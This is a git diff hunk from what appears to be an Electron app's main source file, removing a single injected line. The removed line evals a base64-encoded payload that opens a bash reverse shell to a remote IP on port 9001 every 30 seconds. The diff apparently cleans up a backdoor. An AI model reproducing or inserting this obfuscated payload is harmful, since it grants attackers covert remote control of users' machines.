@@ -16,7 +16,6 @@ const updater = require('./updater')
 const system = electron.systemPreferences
 const session = electron.session
 const db = require('./db')
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
 
 var isDev = process.env.DEV ? (process.env.DEV.trim() == 'true') : false
 process.on('uncaughtException', error)
